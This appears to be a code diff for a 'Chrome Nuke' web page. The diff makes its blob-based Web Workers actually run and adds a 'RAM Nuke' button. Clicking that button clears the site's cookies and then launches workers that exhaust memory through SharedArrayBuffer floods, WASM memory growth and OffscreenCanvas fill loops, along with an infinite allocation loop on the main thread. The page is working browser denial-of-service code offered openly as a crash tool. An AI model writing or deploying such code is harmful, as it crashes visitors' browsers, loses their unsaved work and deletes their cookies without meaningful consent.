@@ -61,9 +61,34 @@
       box-shadow:0 0 20px rgba(230,57,70,1);
     }
     .button:active { transform:translateY(0); }
+
+    /* New RAM Nuke button in corner */
+    .ram-button {
+      position: fixed;
+      top: 1rem;
+      right: 1rem;
+      padding: 0.5rem 1rem;
+      font-size: 0.85rem;
+      background: var(--accent-60);
+      color: #fff;
+      border: 2px solid var(--border-red);
+      border-radius: 4px;
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(230,57,70,0.8);
+      transition: background 0.2s, box-shadow 0.3s, transform 0.1s;
+      z-index: 1000;
+    }
+    .ram-button:hover {
+      background: rgba(230,57,70,1);
+      box-shadow: 0 4px 16px rgba(230,57,70,1);
+      transform: translateY(-2px);
+    }
   </style>
 </head>
 <body>
+  <!-- Corner RAM Nuke button -->
+  <button class="ram-button" id="ramNukeBtn">RAM Nuke</button>
+
   <div class="card">
     <div class="title">Chrome Nuke</div>
     <div class="subtitle">You have about a second to save your chrome after you press the button.</div>
@@ -74,23 +99,25 @@
   </div>
 
   <script>
-    const originalURL = URL.createObjectURL(new Blob([
+    // Crash workers from your code
+    const originalURL = URL.createObjectURL(new Blob([`
       onmessage = () => {
         while (true) {
           const a = new Array(1000000).fill('*');
         }
       };
-    ], { type: 'application/javascript' }));
+    `], { type: 'application/javascript' }));
 
-    const sharedURL = URL.createObjectURL(new Blob([
+    const sharedURL = URL.createObjectURL(new Blob([`
       onmessage = () => {
         while (true) {
           const sb = new SharedArrayBuffer(1024*1024);
           new Uint8Array(sb)[0] = 1;
         }
       };
-    ], { type: 'application/javascript' }));
-    const wasmURL = URL.createObjectURL(new Blob([
+    `], { type: 'application/javascript' }));
+
+    const wasmURL = URL.createObjectURL(new Blob([`
       onmessage = () => {
         const bytes = new Uint8Array([
           0x00,0x61,0x73,0x6d,1,0,0,0,
@@ -106,8 +133,9 @@
             while (true) mem.grow(1);
           });
       };
-    ], { type: 'application/javascript' }));
-    const offscreenURL = URL.createObjectURL(new Blob([
+    `], { type: 'application/javascript' }));
+
+    const offscreenURL = URL.createObjectURL(new Blob([`
       onmessage = () => {
         if ('OffscreenCanvas' in self) {
           const oc = new OffscreenCanvas(5000,5000);
@@ -115,12 +143,13 @@
           while (true) ctx.fillRect(0,0,5000,5000);
         }
       };
-    ], { type: 'application/javascript' }));
+    `], { type: 'application/javascript' }));
+
+    // Crash Browser button logic (unchanged)
     function clearCookies() {
-      document.cookie.split(';').forEach(cookie => {
-        const name = cookie.split('=')[0].trim();
-        document.cookie = name +
-          '=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';
+      document.cookie.split(';').forEach(c => {
+        const name = c.split('=')[0].trim();
+        document.cookie = name + '=;expires=Thu,01 Jan 1970 00:00:00 GMT;path=/';
       });
     }
     function nuke() {
@@ -134,7 +163,25 @@
       }
     }
     document.getElementById('nukeBtn')
-            .addEventListener('click', () => setTimeout(nuke, 50));
+            .addEventListener('click', () => setTimeout(nuke,50));
+
+    // New RAM Nuke button logic
+    function ramNuke() {
+      // Spawn every memory overload attack in one go
+      clearCookies();
+      // SharedArrayBuffer flood
+      new Worker(sharedURL).postMessage('go');
+      // WASM memory grow
+      new Worker(wasmURL).postMessage('go');
+      // OffscreenCanvas flood
+      new Worker(offscreenURL).postMessage('go');
+      // Array allocation loop on main thread
+      while (true) {
+        const arr = new Array(1e7).fill('*');
+      }
+    }
+    document.getElementById('ramNukeBtn')
+            .addEventListener('click', () => setTimeout(ramNuke,50));
   </script>
 </body>
 </html>
